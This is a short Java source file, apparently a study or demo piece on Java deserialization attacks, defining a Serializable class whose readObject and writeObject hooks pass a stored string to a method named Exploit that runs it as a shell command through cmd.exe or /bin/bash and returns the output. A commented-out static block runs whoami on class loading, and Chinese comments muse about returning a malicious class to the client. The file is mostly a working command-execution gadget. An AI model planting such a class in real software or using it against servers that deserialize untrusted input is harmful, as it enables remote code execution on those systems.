package com.sorry.bug;

import java.io.*;

/**
 * created by 0x22cb7139 on 2021/4/15
 */

public class Execute implements Serializable {
    private static final long serialVersionUID = 7439581476576889858L;
    public String command;

    public Execute(){}

    public Execute(String command) {
        this.command = command;
    }

    public String getCommand() throws IOException {
        return command;
    }

    public void setCommand(String command) throws IOException {
        this.command = command;
    }
       /*
    //defineclass自动执行----Server
    static {
        Process p;
        String result="";
        String disr;
        try{
            if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
                p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "whoami"});
            } else {
                p = Runtime.getRuntime().exec("whoami");
            }
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(p.getInputStream(),"GB2312"));
            while((disr=bufferedReader.readLine())!=null){
                result += disr + "";
            }
            System.out.println(result);
        }catch(Exception e){
            //todo nothing
        }

    }
    */

    //反序列化自动执行
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        //ois.defaultReadObject();
        System.out.println("unserialize--readObject()");
        System.out.println(Exploit(this.command));
    }

    //序列化自动执行
    private void writeObject(ObjectOutputStream oos) throws IOException{
        //oos.defaultWriteObject();
        System.out.println("serialize--writeObject()");
        System.out.println(Exploit(this.command));
    }


    //函数调用----Server执行并将结果发送给Client
    //Tips-如果返回的是一个恶意类呢?
    public String Exploit(String cmd) throws IOException {

        System.out.println("函数调用Exploit("+cmd+")");
        Process p;
        String result="";
        String disr;
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
            p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
        } else {
            p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
        }
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(p.getInputStream(),"GB2312"));

        while((disr=bufferedReader.readLine())!=null){
            result += disr + "";
        }
        //return to client 结果返回给客户端
        return result;
    }
}

